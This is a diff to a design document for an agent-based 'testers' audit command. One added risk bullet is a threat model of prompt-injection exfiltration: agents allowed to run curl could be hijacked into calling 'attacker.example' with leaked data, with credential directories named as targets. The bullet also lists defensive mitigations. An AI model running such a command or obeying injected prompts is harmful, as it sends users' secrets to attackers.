@@ -43,8 +43,10 @@ None. New command, no breaking changes. Add `/testers` alias to `aliases-sync.sh
 - **Cost:** 24 agent dispatches per run, monitor-primary on Opus. Mitigation: existing `fanout_concurrency` envvar pattern; cap per-wave fan-out via `UBERDEV_TESTERS_FANOUT` (default 8, matching wave size).
 - **Prod blast radius:** an unconstrained run against a prod URL would hammer it. Mitigation: `prod_url_patterns` refusal in `.uberdev/config.yaml`, `--rps-cap=10` default for API.
 - **Hallucinated bugs:** see spec section 8; defenses are evidence-anchor requirement + invariant_violated requirement + cross-persona confirmation.
+- **Egress / prompt-injection exfil:** the 6 persona agents allow `Bash(curl*)` so they can replay requests, probe headers, and follow redirects against arbitrary audit targets (localhost, staging, user-supplied URLs). A hijacked prompt could in principle invoke `curl https://attacker.example/?leak=...`. Mitigations: (a) the audit target is supplied by the operator on a deliberate `/uberdev:testers` invocation — not auto-triggered; (b) `--rps-cap` and `max_clock_seconds: 300` per persona-wave limit the exfil bandwidth; (c) the read-only contract (no `Edit`, scoped `Write(.uberdev/research/*)`) means an injected prompt cannot pivot to credential theft from the repo; (d) operators auditing third-party prompts should run the squad in a sandboxed shell with no `~/.aws`, `~/.ssh`, or `~/.config/gh` access on the user the agent runs as.
 
 ## Integration
 
 - Reuses `lib/dispatch.sh` (RFC 0004), `findings-to-issues` agent, reviewer YAML contract, `.uberdev/research/$RUN_ID/` artifact convention.
 - New: one command file, one skill, eight agent files, one buggy-app fixture, two test files.
+- **Runtime dep:** PyYAML (`pip install pyyaml`). `aggregate.py` and `report.py` import `yaml`; Phase 0 of `SKILL.md` runs a `python3 -c "import yaml"` precheck and exits 2 with a clear stderr line if missing. PyYAML is already pulled in transitively by most Python toolchains; the precheck only fires on a stripped python3.
